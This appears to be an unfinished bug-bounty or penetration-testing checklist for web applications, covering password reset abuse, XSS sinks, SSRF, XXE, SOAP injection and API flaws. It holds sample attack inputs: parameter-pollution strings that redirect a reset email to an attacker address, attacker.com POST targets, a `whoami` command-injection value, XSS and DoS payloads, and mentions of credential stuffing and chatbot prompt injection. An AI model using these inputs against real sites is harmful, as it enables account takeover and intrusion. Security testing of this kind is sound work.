<h1>Exploiting the findings</h1>

- [ ] **Question to consider**
  - [ ] What are the historical and known vulnerabilities for the findings that I have learned and gathered of, for my target?
  - [ ] What are we even looking for with our identified findings?
- [ ] **Usernames**
  - [ ] Credential Spraying
  - [ ] Credential Stuffing: https://github.com/valeriyshevchenko90/WhereToGo
- [ ] **Upload Function**
  - [ ] Integrations (from third parties)
    - [ ] XSS
  - [ ] Self Uploads
    - [ ] XML based (Docs/PDF)
        - [ ] SSRF, XSS, XXE
    - [ ] Image
      - [ ] XSS, Shell
        - [ ] Name, Binary Header, Metadata
  - [ ] Where is the data stored?
    - [ ] s3 perms
- [ ] **Content Types**
  - [ ] multipart-forms 
    - [ ] Shell, Injections, ++
  - [ ] XML
    - [ ] XXE
  - [ ] json
    - [ ] API Vulnerabilities
- [ ] **APIs**
  - [ ] Lack of authentication
  - [ ] SQL Injection
  - [ ] Information Disclosure
  - [ ] IDOR
  - [ ] Business Logic Flaw
  - [ ] 403 Bypass
  - [ ] Hidden Funcionalty chain
- [ ] **Account Section**
  - [ ] Profile
    - [ ] Stored XSS, Blind XSS (just put a blind payload in)
  - [ ] App Custom Fields
    - [ ] Stored XSS, SSTI
  - [ ] Integrations
    - [ ] SSRF, XSS
  - [ ] Login
    - [ ] CSRF
      - [ ] Login, remove the csrf token, and see if the app still logs you in.
    - [ ] SQLi
- [ ] **Password Reset Functionality**
  - [ ] You can test for password reset poisoning
  - [ ] Test for HTTP Parameter Pollution
    * email=victim@gmail.com&email=attacker@gmail.com
    * email[]=victim@gmail.com&email[]=attacker@gmail.com
    * email=victim@gmail.com%20email=attacker@gmail.com
    * {"email":"victim@gmail.com","email":"attacker@gmail.com"}
    * {"email":["victim@gmail.com","email":"attacker@gmail.com"]}
  - [ ] Check if you can reset victim's password using the link received in the attacks inbox
    - [ ] Look for IDOR while resetting a password through password reset link. Use paramminer to discover additional parameters or append previously known parameters (for example, you may find a parameter uid while updating your profile) in the request
    - [ ] Check if you can guess how the password reset tokens are generated (broken crypto)
    - [ ] Reset token leakage via referral header
      - [ ] open the password reset link and click on any external link in the page (source code)
    - [ ] Token leakage in response/JS files
      - [ ] Search for password reset tokens in the response or in JS files
    - [ ] Check and see if password reset expires or not after password reset
    - [ ] Check for weak password policy (add only a space in the password field)
    - [ ] Request for password reset link, and then click on the old one to see if it works.
  - [ ] POST manipulation
    - [ ] Try:
      * POST https://attacker.com/resetpassword.php 
      * POST @attacker.com/resetpassword.php
      * POST :@//attacker.com/resetpassword.php 
      * POST /resetpassword.php@attacker.com
  - [ ] See is CVE-2020-7245 is applicable 
    * https://nvd.nist.gov/vuln/detail/CVE-2020-7245
  - [ ] Application level DOS
    - [ ] set a really long password and see if you get 500 error or long time delay
  - [ ] Try command injection:
    * email=hello@`whoami`.xyz.burpcollaborator.net
  - [ ] 2FA auto-disabled after password reset.
  - [ ] Check if param values are reflected in the email (HTMLi) 
  - [ ] Check if forgot password contains XML (XXE)

    
- [ ] **Email**
  - [ ] Email injection
  - [ ] Email-based SSRF
  - [ ] Parameter Pollution
  - [ ] Email Header Injection
  - [ ] Wildcard abuse
  - [ ] Email-based XSS
- [ ] **HTTP Requests**
  - [ ] When to try HTTP Request Smuggling (Double Requests)
    - [ ] Presence of multiple Front-Ends like CDN or load balancers
    - [ ] Application behaves inconsistently with Content-Length and Transfer-Encoding
    - [ ] Application gives different responses to the same request
    - [ ] Outdated software with a history of this vulnerability
    - [ ] Error messages in response to ambiguous 
- [ ] **Errors**
  - [ ] Exotic Injection
  - [ ] App DoS
  - [ ] Injection
- [ ] **Paths or URLS passed as values**
  - [ ] SSRF
  - [ ] Redirects
- [ ] **Parameters**
  - [ ] Do you see something like '\__proto__\'?
    - [ ] Prototype pollution
  - [ ] Dynamic Scanning/Web Fuzzing/Payload Scanning (injecting various payloads into 1 param to see how it behaves)
    - [ ] Burp Pro can help, but other tools like ffuf also exist
      - [ ] if you use burp pro: when you feel like a parameter might be subject to a vulnerability and you want to specifically scan it you can send the request to intruder, mark the place with payload markers, and then right click and choose scan defined insertion points.
  - [ ] Fault Injection
    - [ ] Fuzz routes and parameters to elicit errors with: https://portswigger.net/research/backslash-powered-scanning-hunting-unknown-vulnerability-classes
      - [ ] Interpreting Results with SSQLR
      - [ ] Sensitive = Status Code
      - [ ] Secrets = Size
      - [ ] Were = Word Count
      - [ ] Leaked = Lines
      - [ ] Recently = Response Time
  - [ ] IDOR
- [ ] **Status Codes**
- [ ] 401 - 




- [ ] **Chatbots**
  - [ ] Blind XSS
  - [ ] Prompt Injection (AI)
- [ ] **CVE**
    - [ ] Google dork / Github Dork for vulnerabilities with tech used and versions
    - [ ] Exploitdb for vulns
    - [ ] Metasploit for vulns
    - [ ] Snyk is also good for learning about what vulns are out there for a tech
    - [ ] Sometimes chatgpt can even give you CVE numbers to search up.
    
<h1>Vulnerabilites, but how do you know?</h1>

- [ ] **Reflected XSS**
  - [ ] Valid URL (Browser Renders it)
  - [ ] Explicit decoding on server-side to break context and execute javscript
  - [ ] No server-side decoding is useful to break the context and execute javascript
  - [ ] SVG based Javascript Execution
    - [ ] Can also be used to inject a payload in img tags (example <\img src="https://example.com/xss%22nmouseover=%22alert(1);imagefile.svg" onmouseover="alert(1)" alt>)
    - [ ] also look for "data:image/svg+xml;base64,..."
    - [ ] also look for <\img src="">
      - [ ] Example: <\img src=javscript:while(1){}> //DoS script
- [ ] **DOM XSS**
  - [ ] You will need a valid URL, and a Sink to have the criteria for stored XSS (check for both!)
    - [ ] Main sinks: 
      * document.write()
      * document.writeln()
      * document.domain
      * element.innerHTML
      * element.outerHTML
      * element.insertAdjacentHTML
      * element.onevent
    - [ ] jquery sinks: 
      * add()
      * after()
      * append()
      * animate()
      * insertAfter()
      * insertBefore()
      * before()
      * html()
      * prepend()
      * replaceAll()
      * replaceWith()
      * wrap()
      * wrapInner()
      * wrapAll()
      * has()
      * constructor()
      * init()
      * index()
      * jQuery.parseHTML()
      * $.parseHTML()   
    - [ ] Other common sinks: 
      * eval()
      * Function()
      * setTimeout()
      * setInterval()
      * setImmediate()
      * execCommand()
      * execScript()
      * msSetImmediate()
      * range.createContextualFragment()
      * crypto.generateCRMFRequest()
    
    - [ ] To exploit, you have to place data into a source (input, parameter, etc) this is propogated to a sink
    - [ ] To test for this, you can use dev tools and test each source, looking for sinks.
      - [ ] Burp scanner can automate this.

- [ ] **SOAP Injection**
  - [ ] submit a rogue closing tag like <\/foo>
    - [ ] If no error is received, then not vulnerable
    - [ ] If an error is received, then enter a valid open and closing pair <\foo></\foo>
      - [ ] If this causes the error to disappear, then the application is vulnerable.
    - [ ] You can also use comments to open and close parameters !----> or </!---- 

- [ ] **Server-side HTTP redirect**
  - [ ] Check parameters that contain hostnames like "location" to see if they will redirect the server to an external site.
  - [ ] If there is a long delay, then the server might be timing out due to rules or restrictions

- [ ] **Prototype Pollution**

- [ ] ***This checklist is incomplete and still in progress***
